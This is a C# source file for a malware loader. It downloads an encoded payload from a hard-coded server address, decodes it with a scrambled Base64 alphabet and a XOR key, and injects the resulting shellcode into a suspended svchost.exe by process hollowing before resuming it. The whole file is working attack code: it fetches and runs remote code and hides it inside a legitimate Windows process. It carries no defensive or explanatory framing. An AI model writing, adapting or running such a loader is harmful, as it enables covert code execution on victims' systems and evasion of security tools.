using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Process_Hollowing
{
    class Program
    {
        // P/Invoke signatures and constants
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        private static extern uint ZwQueryInformationProcess(IntPtr hProcess, PROCESSINFOCLASS pic, ref PROCESS_BASIC_INFORMATION pbi, uint cb, out uint pbiLength);

        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PROCESS_CREATE_THREAD = 0x0002;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_VM_READ = 0x0010;
        private const uint CREATE_SUSPENDED = 0x00000004;
        private const int PROCESSBASICINFORMATION = 0;

        // Structures for P/Invoke
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public uint UniquePid;
            public IntPtr MoreReserved;
        }

        public enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0,
        }

        // Main method to fetch and decrypt shellcode
        public static void Main(string[] args)
        {
        // Fetch the encoded data from the server
        string url = "http://192.168.68.58:8000/hewwo.txt";
        WebClient webClient = new WebClient();
        string encodedData = webClient.DownloadString(url);

        // Decode the data from custom Base64
        byte[] combinedData = CustomBase64Decode(encodedData, "WYXADCBEFGHIJPLMNOKQRSTUVZzyxabcdefghijklmnopqrstuvw0123456789+/");

        // Extract the XOR key (first 8 bytes) and the encrypted shellcode
        byte[] xorKey = new byte[8];
        Array.Copy(combinedData, 0, xorKey, 0, xorKey.Length);
        byte[] encryptedShellcode = new byte[combinedData.Length - xorKey.Length];
        Array.Copy(combinedData, xorKey.Length, encryptedShellcode, 0, encryptedShellcode.Length);

        // Decrypt the shellcode using the XOR key
        byte[] decryptedShellcode = XORDecrypt(encryptedShellcode, xorKey);

        // Execute the decrypted shellcode using process hollowing
        ProcessHollow(decryptedShellcode);
    }

        // Method to decrypt shellcode (update with actual decryption logic)
        private static byte[] XORDecrypt(byte[] data, byte[] key)
        {
            byte[] decrypted = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                decrypted[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return decrypted;
        }

        //Customer Base64 Function

        private static byte[] CustomBase64Decode(string encoded, string alphabet)
        {

            string standardAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            StringBuilder standardEncoded = new StringBuilder(encoded.Length);

            foreach (char c in encoded)
            {
                if (c == '=')
                {
                    standardEncoded.Append(c);
                }
                else
                {
                    int index = alphabet.IndexOf(c);
                    if (index >= 0)
                    {
                        if (index < 62) standardEncoded.Append(standardAlphabet[index]);
                        else if (index == 62) standardEncoded.Append('+');
                        else if (index == 63) standardEncoded.Append('/');
                    }
                }
            }

            return Convert.FromBase64String(standardEncoded.ToString());
        }



        // Hollow method to perform process hollowing and execute the shellcode
        private static void ProcessHollow(byte[] shellcode)
        {
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            STARTUPINFO startupInfo = new STARTUPINFO();
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();

            // Path to a benign executable, e.g., svchost.exe
            string path = @"C:\Windows\System32\svchost.exe";

            // Create a new process in a suspended state
            bool procInit = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref startupInfo, ref procInfo);
            if (!procInit)
            {
                Console.WriteLine("[-] Could not create the process.");
                return;
            }
            Console.WriteLine("[*] Process created successfully. PID: {0}", procInfo.dwProcessId);

            // Query for the process's basic information to get the address of its PEB
            uint retLength = 0;
            ZwQueryInformationProcess(procInfo.hProcess, PROCESSINFOCLASS.ProcessBasicInformation, ref pbi, (uint)(IntPtr.Size * 6), out retLength);
            IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);
            Console.WriteLine("[*] Image Base Address found: 0x{0:X}", imageBaseAddr.ToInt64());

            // Read the image base address of the created process
            byte[] baseAddrBytes = new byte[8];
            ReadProcessMemory(procInfo.hProcess, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out _);
            IntPtr execAddr = (IntPtr)BitConverter.ToInt64(baseAddrBytes, 0);

            // Read the DOS header to find the e_lfanew field
            byte[] data = new byte[0x200];
            ReadProcessMemory(procInfo.hProcess, execAddr, data, data.Length, out _);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            Console.WriteLine("[*] e_lfanew: 0x{0:X}", e_lfanew);

            // Calculate the entry point address and write the shellcode there
            uint rvaOffset = e_lfanew + 0x28;
            uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);
            IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
            Console.WriteLine("[*] Entrypoint found: 0x{0:X}", entrypointAddr.ToInt64());

            WriteProcessMemory(procInfo.hProcess, entrypointAddr, shellcode, shellcode.Length, out _);
            Console.WriteLine("[*] Shellcode injected. Resuming thread...");

            // Resume the thread to execute the shellcode
            ResumeThread(procInfo.hThread);
        }
    }
}
